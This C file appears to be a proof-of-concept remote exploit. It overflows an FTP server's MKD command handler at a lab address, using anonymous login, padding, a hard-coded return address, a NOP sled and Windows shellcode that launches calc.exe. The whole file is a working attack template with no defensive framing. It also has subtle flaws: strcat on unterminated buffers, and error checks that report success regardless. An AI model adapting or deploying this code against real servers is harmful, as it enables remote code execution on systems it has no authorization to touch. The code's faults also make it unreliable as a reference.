#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

void socketSend(int sock, char *input) {
  int sockSend;
  sockSend = send(sock, input, 1024, 0);
  if(sockSend < 0){
    printf("sending of buffer failed\n");
  } printf("exploit sent successfully\n");
  sleep(1);
}

int main(){
  int sock;
  int conn;
  int sockSend;
  struct sockaddr_in target;
  char *serverIP = "172.16.50.128";
  int serverPort = 21;
  char winExec[] = "\x33\xc0\x50\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x8B\xC4\x6A\x01\x50\xBB\x5D\x2B\x86\x7C\xFF\xD3";
  char buffer[45];
  char inp[800] = "MKD ";
  char fullBuff[749];
  char op[] = "\x59\x54\xC3\x77";
  char user[] = "USER anonymous\r\n";
  char pass[] = "PASS anonymous\r\n";
  char quit[] =  "QUIT\r\n";

  memset(buffer, 0x90, 20);
  strcat(buffer, winExec);
  memset(fullBuff, 0x41, 247);
  strcat(fullBuff, op);
  strcat(fullBuff, buffer);
  strcat(inp, fullBuff);

  printf("%s", fullBuff);

  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock == -1) {
    printf("could not create socket\n");
  }

  target.sin_family = AF_INET;
  target.sin_addr.s_addr = inet_addr(serverIP);
  target.sin_port = htons(serverPort);

  conn = connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr_in));
  if (conn < 0){
    printf("connection to target failed\n");
  }printf("successfully connnected to target\n");
  sleep(3);

  socketSend(sock, user);
  socketSend(sock, pass);
  socketSend(sock, inp);
  socketSend(sock, quit);

}
